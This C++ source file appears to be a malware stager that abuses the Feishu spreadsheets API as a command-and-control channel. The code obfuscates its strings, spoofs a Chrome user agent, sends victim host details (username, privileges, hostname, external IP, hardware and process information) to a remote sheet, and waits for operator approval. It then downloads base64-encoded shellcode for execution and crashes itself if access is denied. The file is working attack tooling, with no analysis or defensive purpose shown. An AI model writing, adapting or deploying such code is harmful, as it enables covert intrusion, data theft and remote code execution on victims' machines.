#include "infoSender.h"
#include "../recon/recon.h"
#include "../Tools.h"
#include <rapidjson/document.h>
#include "../md5.h"

HttpClient client;

std::string g_send_time = "";
int g_index = get_current_index();

std::string fetch_tenant_access_token() {
    std::string url = "https://open.feishu.cn/open-apis/auth/v3/tenant_access_token/internal";

    std::stringstream ss;
    ss << ENCRYPT_STR(R"({"app_id":")") << AppID
        << ENCRYPT_STR(R"(","app_secret":")") << AppSecret
        << ENCRYPT_STR(R"("})");
    std::string body = ss.str();

    std::vector<std::string> headers = {
        ENCRYPT_STR("Content-Type: application/json"),
        ENCRYPT_STR("User-Agent: \"Google Chrome\";v=\"135\", \"Not - A.Brand\";v=\"8\", \"Chromium\";v=\"135\"")
    };
    std::string response = client.sendRequest(url, ENCRYPT_STR("POST"), body, headers);


    rapidjson::Document doc;
    if (doc.Parse(response.c_str()).HasParseError()) {
        return "";
    }

    if (!doc.HasMember("tenant_access_token") || !doc["tenant_access_token"].IsString()) {
        return "";
    }
    std::string token = doc["tenant_access_token"].GetString();
    return token;
}


void set_current_index(int intIndex) {
    std::string url = ENCRYPT_STR("https://open.feishu.cn/open-apis/sheets/v2/spreadsheets/") + SpreadsheetToken + ENCRYPT_STR("/values");
    std::stringstream ss;
    std::string index = std::to_string(intIndex);

    ss << ENCRYPT_STR(R"({"valueRange":{"range":")") << SheetID << "!A51:A51"
        << ENCRYPT_STR(R"(","values":[[)") << index
        << ENCRYPT_STR(R"(]]}})");

    std::string body = ss.str();

    std::vector<std::string> headers = {
        ENCRYPT_STR("Content-Type: application/json"),
        ENCRYPT_STR("Authorization: Bearer ") + fetch_tenant_access_token(),
        ENCRYPT_STR("User-Agent: \"Google Chrome\";v=\"135\", \"Not - A.Brand\";v=\"8\", \"Chromium\";v=\"135\"")
    };

    std::string response = client.sendRequest(url, ENCRYPT_STR("PUT"), body, headers);
}


int get_current_index() {
    std::string spreadsheet_token = SpreadsheetToken;
    std::string sheet_id = SheetID;
    std::string range = "A51:A51";

    std::string url = ENCRYPT_STR("https://open.feishu.cn/open-apis/sheets/v2/spreadsheets/") + spreadsheet_token + ENCRYPT_STR("/values/") + sheet_id + ENCRYPT_STR("!") + range;

    std::vector<std::string> headers = {
        ENCRYPT_STR("User-Agent: \"Google Chrome\";v=\"135\", \"Not - A.Brand\";v=\"8\", \"Chromium\";v=\"135\""),
        ENCRYPT_STR("Authorization: Bearer ") + fetch_tenant_access_token(),
        ENCRYPT_STR("Accept: application/json")
    };

    std::string response = client.sendRequest(url, ENCRYPT_STR("GET"), "", headers);

    rapidjson::Document doc;
    
    if (doc.Parse(response.c_str()).HasParseError()) return 0;

    const auto& root = doc;
    if (!root.HasMember("data") || !root["data"].HasMember("valueRange"))
        return 0;

    const auto& valueRange = root["data"]["valueRange"];
    if (!valueRange.HasMember("values") || !valueRange["values"].IsArray())
        return 0;

    const auto& rows = valueRange["values"];
    if (rows.Size() == 0 || !rows[0].IsArray())
        return 0;

    const auto& firstRow = rows[0];
    if (firstRow.Size() == 0 || !firstRow[0].IsInt())
        return 0;

    int index = firstRow[0].GetInt();
    return index;

}

// 获取 External IP
std::string fetch_current_external_ip() {
    std::string url = ENCRYPT_STR("http://ipinfo.io/ip");

    std::stringstream ss;
    std::string body = ss.str();

    std::vector<std::string> headers = {
        ENCRYPT_STR("User-Agent: \"Google Chrome\";v=\"135\", \"Not - A.Brand\";v=\"8\", \"Chromium\";v=\"135\"")
    };

    std::string response = client.sendRequest(url, ENCRYPT_STR("GET"), body, headers);

    return response;
}


void insert_data() {

    std::string url = ENCRYPT_STR("https://open.feishu.cn/open-apis/sheets/v2/spreadsheets/") + SpreadsheetToken + ENCRYPT_STR("/values");
    std::stringstream ss;

    std::string index = std::to_string(g_index);
    std::string timeStr = getCurrentTime();
    std::string userStr = GetUsername();
    std::string privilegeStr = GetAccountPrivilege();
    std::string hostnameStr = GetHostname();

    g_send_time = timeStr;

    std::string physicalMemoryStr = std::to_string(GetPhysicalMemory());
    std::string cpuCoreNumStr = std::to_string(GetCpuCoreNum());
    std::string bootTimeStr = std::to_string(GetBootTimeMinute());
    std::string resolutionStr = GetResolution();
    std::string tempFileNumStr = std::to_string(GetTempFileNum());
    std::string currentExeDirStr = GetCurrentExeDir();
    std::string parentProcessNameStr = GetParentProcessName();


    ss << ENCRYPT_STR(R"({"valueRange":{"range":")") << SheetID << "!A" << index << ":M20"
        << ENCRYPT_STR(R"(","values":[[")") << timeStr
        << ENCRYPT_STR(R"(",")") << privilegeStr
        << ENCRYPT_STR(R"(",")") << userStr
        << ENCRYPT_STR(R"(",")") << hostnameStr
        << ENCRYPT_STR(R"(",")") << fetch_current_external_ip()
        << ENCRYPT_STR(R"(",)") << ENCRYPT_STR("null")
        << ENCRYPT_STR(R"(,")") << cpuCoreNumStr
        << ENCRYPT_STR(R"(",")") << physicalMemoryStr
        << ENCRYPT_STR(R"(",")") << resolutionStr
        << ENCRYPT_STR(R"(",")") << currentExeDirStr
        << ENCRYPT_STR(R"(",")") << parentProcessNameStr
        << ENCRYPT_STR(R"(",")") << bootTimeStr
        << ENCRYPT_STR(R"("]]}})");

    std::string body = ss.str();

    std::vector<std::string> headers = {
        ENCRYPT_STR("Content-Type: application/json"),
        ENCRYPT_STR("Authorization: Bearer ") + fetch_tenant_access_token(),
        ENCRYPT_STR("User-Agent: \"Google Chrome\";v=\"135\", \"Not - A.Brand\";v=\"8\", \"Chromium\";v=\"135\"")
    };

    std::string response = client.sendRequest(url, ENCRYPT_STR("PUT"), body, headers);

}

void send_info() {
    if (g_index == 0) {
        set_current_index(2);
    }
    else{
        insert_data();
        set_current_index(g_index+1);
    }
}


bool extract_payload_if_allowed(const std::string& response, std::vector<std::string>& payload_parts) {
    rapidjson::Document doc;
    if (doc.Parse(response.c_str()).HasParseError()) {
        return false;
    }

    const auto& root = doc;
    if (!root.HasMember("data") || !root["data"].HasMember("valueRange"))
        return false;

    const auto& valueRange = root["data"]["valueRange"];
    if (!valueRange.HasMember("values") || !valueRange["values"].IsArray())
        return false;

    const auto& rows = valueRange["values"];
    if (rows.Size() == 0 || !rows[0].IsArray())
        return false;

    const auto& row = rows[0];

    if (row.Size() == 0 || row[0].IsNull()) { // 为空 说明还没写入 返回false 重试
        return false;
    }

    if (row.Size() > 0 && row[0].IsBool()) {
        if (!row[0].GetBool()) memcpy(0, 0, 0); // 如果拒绝准入直接AccessDenied 死出去
    }

    for (rapidjson::SizeType i = 1;  i < row.Size(); ++i) {
        const auto& item = row[i];
        if (item.IsNull()) break;
        if (!item.IsString()) break;
        payload_parts.push_back(item.GetString());
    }

    return true;
}
std::string JoinPayloadParts(const std::vector<std::string>& payload_parts) {
    std::string payload;
    for (const auto& part : payload_parts) {
        payload += part;
    }
    return payload;
}
std::vector<unsigned char> fetch_payload(){
    std::string spreadsheet_token = SpreadsheetToken;
    std::string sheet_id = SheetID;
    std::string index = std::to_string(g_index);
    std::string range = "O" + index + ":AO" + index;

    
    std::string url = ENCRYPT_STR("https://open.feishu.cn/open-apis/sheets/v2/spreadsheets/") + spreadsheet_token + ENCRYPT_STR("/values/") + sheet_id + ENCRYPT_STR("!") + range;

    std::vector<std::string> headers = {
        ENCRYPT_STR("User-Agent: \"Google Chrome\";v=\"135\", \"Not - A.Brand\";v=\"8\", \"Chromium\";v=\"135\""),
        ENCRYPT_STR("Authorization: Bearer ") + fetch_tenant_access_token(),
        ENCRYPT_STR("Accept: application/json")
    };

    std::string response = client.sendRequest(url, ENCRYPT_STR("GET"), "", headers);
    std::vector<std::string> payload_parts;

    // 拒绝准入 直接死
    // 返回空 等待几秒后轮询
    while (!extract_payload_if_allowed(response, payload_parts)) {
        custom_sleep(10 * 1000);
    }

    if (payload_parts.size() == 0) return std::vector<unsigned char>{};

    std::string payload = JoinPayloadParts(payload_parts);
    std::string decoded = Base64Decode(payload);
    std::vector<unsigned char> shellcode(decoded.begin(), decoded.end());
    return shellcode;
}
